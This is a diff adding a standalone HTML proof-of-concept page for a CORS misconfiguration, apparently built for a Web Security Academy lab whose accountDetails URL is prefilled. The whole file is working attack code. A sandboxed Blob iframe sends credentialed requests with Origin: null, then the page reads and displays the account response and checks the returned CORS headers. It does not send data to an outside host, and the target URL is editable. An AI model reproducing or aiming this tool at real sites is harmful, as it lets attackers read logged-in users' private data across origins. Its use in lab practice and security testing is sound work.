@@ -1,0 +1,82 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC — Origin:null via Blob (no exfil)</title>
+<style>
+  body{font:14px/1.5 system-ui;margin:24px}
+  pre{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;border-radius:8px}
+  .err{color:#b00} input[type=text]{width:720px;max-width:100%}
+</style>
+<h1>CORS PoC — <code>Origin: null</code> (Blob iframe)</h1>
+<p>1) Log in to the target in this browser if creds are needed. 2) Set the endpoint. 3) Choose cookies. 4) Run.</p>
+<p>
+  URL: <input id="u" type="text" value="https://0a3300ef04780f478330539c00b000b3.web-security-academy.net/accountDetails">
+  <label><input type="checkbox" id="creds" checked> Use cookies</label>
+  <button id="run">Run</button>
+</p>
+<div id="meta"></div>
+<h2>Response</h2>
+<pre id="out">(no run yet)</pre>
+
+<script>
+(function(){
+  function $(id){return document.getElementById(id);}
+  function esc(s){return String(s).replace(/[&<>]/g,function(m){return {'&':'&amp;','<':'&lt;','>':'&gt;'}[m];});}
+
+  window.addEventListener('message', function(evt){
+    var d = evt.data || {};
+    if (typeof d !== 'object' || !('ok' in d)) return;
+    var meta = $('meta'), out = $('out');
+    if (!d.ok){ out.classList.add('err'); out.textContent = 'Error: ' + d.error; return; }
+    meta.innerHTML =
+      '<p><strong>Request Origin:</strong> <code>null</code> (sandboxed Blob)<br>' +
+      '<strong>ACAO:</strong> '+esc(d.acao)+' &nbsp; <strong>ACAC:</strong> '+esc(d.acac)+' &nbsp; <strong>Status:</strong> '+d.status+'</p>';
+    out.textContent = d.body;
+    if (d.creds){
+      if (d.acao === 'null' && d.acac === 'true'){
+        meta.insertAdjacentHTML('afterbegin','<p style="color:#090"><strong>CORS READ OK (credentialed, Origin:null)</strong></p>');
+      } else {
+        meta.insertAdjacentHTML('afterbegin','<p class="err"><strong>Headers not proving credentialed Origin:null read</strong></p>');
+      }
+    } else if (d.acao === 'null'){
+      meta.insertAdjacentHTML('afterbegin','<p style="color:#090"><strong>CORS READ OK (no creds, Origin:null)</strong></p>');
+    }
+  });
+
+  $('run').onclick = function(){
+    var target = $('u').value.trim();
+    var useCreds = $('creds').checked;
+
+    $('meta').innerHTML =
+      '<p><strong>Parent origin:</strong> '+esc(location.origin)+'<br>' +
+      '<strong>Target:</strong> '+esc(target)+'<br>' +
+      '<strong>Credentials:</strong> '+useCreds+'</p>';
+    $('out').textContent = 'Fetching…';
+
+    // Child HTML (no backticks)
+    var html =
+      '<!doctype html><meta charset="utf-8">' +
+      '<script>(function(){' +
+      'var url=' + JSON.stringify(target) + ';' +
+      'var useC=' + (useCreds ? 'true' : 'false') + ';' +
+      'fetch(url,{mode:"cors",credentials:(useC?"include":"omit")})' +
+      '.then(function(r){return r.text().then(function(txt){' +
+      '  var acao=r.headers.get("access-control-allow-origin");' +
+      '  var acac=r.headers.get("access-control-allow-credentials");' +
+      '  parent.postMessage({ok:true,creds:useC,status:r.status,acao:acao,acac:acac,body:txt},"*");' +
+      '});}).catch(function(e){' +
+      '  parent.postMessage({ok:false,error:String(e)},"*");' +
+      '});' +
+      '})();<\/script>';
+
+    // Blob -> object URL -> opaque origin
+    var blob = new Blob([html], {type:'text/html'});
+    var url  = URL.createObjectURL(blob);
+
+    var ifr = document.createElement('iframe');
+    ifr.setAttribute('sandbox','allow-scripts'); // no allow-same-origin => Origin:null
+    ifr.style.display = 'none';
+    ifr.src = url;
+    document.body.appendChild(ifr);
+  };
+})();
+</script>
